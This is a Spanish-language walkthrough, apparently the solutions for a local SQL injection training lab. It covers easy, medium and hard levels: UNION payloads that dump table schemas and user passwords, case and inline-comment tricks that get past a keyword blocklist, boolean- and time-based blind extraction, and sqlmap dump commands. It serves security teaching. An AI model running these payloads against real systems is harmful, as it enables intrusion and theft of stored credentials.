Easy — Error-based (sin WAF)

  1. Verifica la inyección — devuelve todos los productos: 
    ' OR '1'='1
  2. Extrae la estructura de la base de datos: 
    ' UNION SELECT null,name,sql FROM sqlite_master--
  3. Extrae datos sensibles de la tabla users: 
    ' UNION SELECT null,username,password FROM users--
  4. O automatiza con sqlmap: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" --dump

Medium — Bypass de blacklist

  1. El WAF bloquea palabras clave en minúsculas. Bypassea con mayúsculas mixtas: 
    ' UnIoN SeLeCt null,username,password FROM users--
  2. O usa comentarios inline para romper las palabras clave: 
    ' /*!UNION*/ /*!SELECT*/ null,username,password FROM users--
  3. O usa sqlmap con tamper de randomcase: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" --tamper=randomcase --dump

Hard — Blind (boolean-based + time-based)

  1. No se muestran errores. Usa boolean-based blind para extraer carácter a carácter: 
    ' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a
    Cambia el carácter hasta que la consulta devuelva resultados.
  2. Time-based blind con SQLite (randomblob genera delay): 
    ' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(300000000) ELSE '' END) IS NOT ''--
  3. Automatiza con sqlmap especificando las técnicas blind: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" --technique=BT --level=3 --risk=2 --dump
